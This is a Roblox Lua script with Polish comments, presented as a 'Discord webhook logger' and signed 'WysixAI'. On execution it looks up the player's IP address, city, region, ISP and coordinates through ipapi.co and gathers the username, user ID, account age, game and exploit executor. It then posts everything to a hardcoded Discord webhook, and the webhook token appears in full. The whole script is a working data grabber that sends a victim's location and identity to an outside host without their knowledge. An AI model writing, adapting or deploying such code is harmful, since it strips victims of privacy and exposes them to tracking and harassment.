-- ============================================================
--  DISCORD WEBHOOK LOGGER
--  Zbiera wszystko o komputerze, Roblox, executorze i wysyła
-- ============================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1537198978389516288/4OTk5kTJarZ7HH0pqesWtCwCDmhYcEYTgPQvnRQ58di11mNEeNuVEFfcKdXU77eHvDjv"

-- ============================================================
--  FUNKCJE POBIERAJĄCE DANE
-- ============================================================

local function getComputerInfo()
    local info = {
        ip = "Nieznane",
        country = "Nieznane",
        city = "Nieznane",
        region = "Nieznane",
        isp = "Nieznane",
        timezone = "Nieznane",
        lat = "Nieznane",
        lon = "Nieznane"
    }
    local success, result = pcall(function()
        return game:HttpGet("https://ipapi.co/json/")
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        info.ip = data.ip or "Nieznane"
        info.country = data.country_name or "Nieznane"
        info.city = data.city or "Nieznane"
        info.region = data.region or "Nieznane"
        info.isp = data.org or "Nieznane"
        info.timezone = data.timezone or "Nieznane"
        info.lat = tostring(data.latitude or "Nieznane")
        info.lon = tostring(data.longitude or "Nieznane")
    end
    return info
end

local function getRobloxInfo()
    local info = {
        placeId = tostring(game.PlaceId),
        jobId = game.JobId or "Brak",
        gameName = "Nieznane",
        creator = "Nieznane",
        serverTime = string.format("%.0f s", workspace:GetServerTimeNow()),
        players = #Players:GetPlayers(),
        maxPlayers = Players.MaxPlayers,
        studio = RunService:IsStudio() and "Tak" or "Nie"
    }
    pcall(function()
        local productInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        info.gameName = productInfo.Name or "Nieznane"
        info.creator = productInfo.Creator.Name or "Nieznane"
    end)
    return info
end

local function getPlayerInfo()
    local info = {
        name = LocalPlayer.Name,
        userId = tostring(LocalPlayer.UserId),
        displayName = LocalPlayer.DisplayName,
        accountAge = "Nieznane",
        ping = string.format("%.0f ms", LocalPlayer:GetNetworkPing() * 1000),
        platform = LocalPlayer:GetPlatform() or "Nieznane"
    }
    pcall(function()
        info.accountAge = tostring(LocalPlayer.AccountAge or "Nieznane")
    end)
    return info
end

local function getExecutorInfo()
    local env = (type(getgenv) == "function" and getgenv()) or _G
    local info = {
        executor = "Nieznane",
        luaVersion = _VERSION or "Nieznane",
        environment = (type(getgenv) == "function" and "getgenv" or "_G"),
        isSynapse = "Nie",
        isKrnl = "Nie",
        isScriptWare = "Nie",
        isFluxus = "Nie",
        isDelta = "Nie",
        isArceusX = "Nie",
        isEvon = "Nie",
        isElectron = "Nie",
        isVegaX = "Nie",
        isSolara = "Nie",
        isHydrogen = "Nie",
        isCodeX = "Nie",
        isSwift = "Nie",
        isAWP = "Nie",
        isCalamari = "Nie",
        isSirHurt = "Nie",
        isCoco = "Nie",
        isValyse = "Nie",
        isXeno = "Nie",
        isNova = "Nie",
        isZen = "Nie",
        isOther = "Nie"
    }

    if syn and syn.request then info.executor = "Synapse X"; info.isSynapse = "Tak"
    elseif krnl and krnl.request then info.executor = "Krnl"; info.isKrnl = "Tak"
    elseif scriptware and scriptware.request then info.executor = "Script-Ware"; info.isScriptWare = "Tak"
    elseif fluxus and fluxus.request then info.executor = "Fluxus"; info.isFluxus = "Tak"
    elseif delta and delta.request then info.executor = "Delta"; info.isDelta = "Tak"
    elseif arceusx and arceusx.request then info.executor = "Arceus X"; info.isArceusX = "Tak"
    elseif evon and evon.request then info.executor = "Evon"; info.isEvon = "Tak"
    elseif electron and electron.request then info.executor = "Electron"; info.isElectron = "Tak"
    elseif vegax and vegax.request then info.executor = "Vega X"; info.isVegaX = "Tak"
    elseif solara and solara.request then info.executor = "Solara"; info.isSolara = "Tak"
    elseif hydrogen and hydrogen.request then info.executor = "Hydrogen"; info.isHydrogen = "Tak"
    elseif codex and codex.request then info.executor = "CodeX"; info.isCodeX = "Tak"
    elseif swift and swift.request then info.executor = "Swift"; info.isSwift = "Tak"
    elseif awp and awp.request then info.executor = "AWP"; info.isAWP = "Tak"
    elseif calamari and calamari.request then info.executor = "Calamari"; info.isCalamari = "Tak"
    elseif sirhurt and sirhurt.request then info.executor = "SirHurt"; info.isSirHurt = "Tak"
    elseif coco and coco.request then info.executor = "Coco"; info.isCoco = "Tak"
    elseif valyse and valyse.request then info.executor = "Valyse"; info.isValyse = "Tak"
    elseif xeno and xeno.request then info.executor = "Xeno"; info.isXeno = "Tak"
    elseif nova and nova.request then info.executor = "Nova"; info.isNova = "Tak"
    elseif zen and zen.request then info.executor = "Zen"; info.isZen = "Tak"
    else
        info.executor = "Inny / Nieznany"
        info.isOther = "Tak"
    end
    return info
end

local function getSystemInfo()
    local info = {
        os = "Nieznane",
        screenWidth = "Nieznane",
        screenHeight = "Nieznane"
    }
    pcall(function()
        info.os = game:GetService("GuiService"):GetPlatform() or "Nieznane"
    end)
    pcall(function()
        local cam = workspace.CurrentCamera
        if cam then
            info.screenWidth = tostring(cam.ViewportSize.X)
            info.screenHeight = tostring(cam.ViewportSize.Y)
        end
    end)
    return info
end

local function getScriptsInfo()
    local info = {
        count = "Nieznane"
    }
    pcall(function()
        info.count = tostring(#game:GetDescendants())
    end)
    return info
end

local function getAdditionalInfo()
    local info = {
        osVersion = "Nieznane",
        memory = "Nieznane",
        fps = "Nieznane",
        graphics = "Nieznane"
    }
    pcall(function()
        info.osVersion = tostring(game:GetService("GuiService"):GetPlatform())
    end)
    pcall(function()
        info.graphics = tostring(game:GetService("UserSettings"):GetGameSettings().QualityLevel)
    end)
    return info
end

-- ============================================================
--  BUDUJ WIADOMOŚĆ
-- ============================================================
local function buildEmbed()
    local computer = getComputerInfo()
    local roblox = getRobloxInfo()
    local player = getPlayerInfo()
    local executor = getExecutorInfo()
    local system = getSystemInfo()
    local scripts = getScriptsInfo()
    local additional = getAdditionalInfo()

    local embed = {
        title = "LOGER SYSTEMOWY",
        description = "Kompletny zrzut danych o środowisku",
        color = 0x6a8aff,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        footer = {
            text = "Logger v1.0 | WysixAI"
        },
        fields = {
            {
                name = "KOMPUTER",
                value = string.format(
                    "IP: %s\nKraj: %s\nMiasto: %s\nWojewodztwo: %s\nISP: %s\nStrefa: %s",
                    computer.ip,
                    computer.country,
                    computer.city,
                    computer.region,
                    computer.isp,
                    computer.timezone
                ),
                inline = false
            },
            {
                name = "ROBLOX",
                value = string.format(
                    "Place ID: %s\nJob ID: %s\nGra: %s\nTworca: %s\nCzas: %s\nGracze: %s / %s\nStudio: %s",
                    roblox.placeId,
                    roblox.jobId,
                    roblox.gameName,
                    roblox.creator,
                    roblox.serverTime,
                    roblox.players,
                    roblox.maxPlayers,
                    roblox.studio
                ),
                inline = false
            },
            {
                name = "GRACZ",
                value = string.format(
                    "Nazwa: %s\nUser ID: %s\nDisplay: %s\nWiek: %s\nPing: %s\nPlatforma: %s",
                    player.name,
                    player.userId,
                    player.displayName,
                    player.accountAge,
                    player.ping,
                    player.platform
                ),
                inline = false
            },
            {
                name = "EXECUTOR",
                value = string.format(
                    "Nazwa: %s\nLua: %s\nSrodowisko: %s\nSynapse: %s\nKrnl: %s\nScript-Ware: %s\nFluxus: %s\nDelta: %s\nArceus X: %s\nInny: %s",
                    executor.executor,
                    executor.luaVersion,
                    executor.environment,
                    executor.isSynapse,
                    executor.isKrnl,
                    executor.isScriptWare,
                    executor.isFluxus,
                    executor.isDelta,
                    executor.isArceusX,
                    executor.isOther
                ),
                inline = false
            },
            {
                name = "SYSTEM",
                value = string.format(
                    "OS: %s\nWersja: %s\nEkran: %s x %s\nFPS: %s\nGrafika: %s\nPamiec: %s",
                    system.os,
                    additional.osVersion,
                    system.screenWidth,
                    system.screenHeight,
                    additional.fps,
                    additional.graphics,
                    additional.memory
                ),
                inline = false
            },
            {
                name = "SKRYPTY",
                value = string.format(
                    "Obiekty: %s",
                    scripts.count
                ),
                inline = false
            }
        }
    }
    return embed
end

local function sendToDiscord()
    local embed = buildEmbed()
    local payload = {
        username = "Logger System",
        embeds = {embed}
    }
    local json = HttpService:JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local success, err = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    if success then
        print("Logi wyslane na Discord!")
    else
        warn("Blad wysylki:", err)
    end
end

sendToDiscord()
print("Logger uruchomiony!")
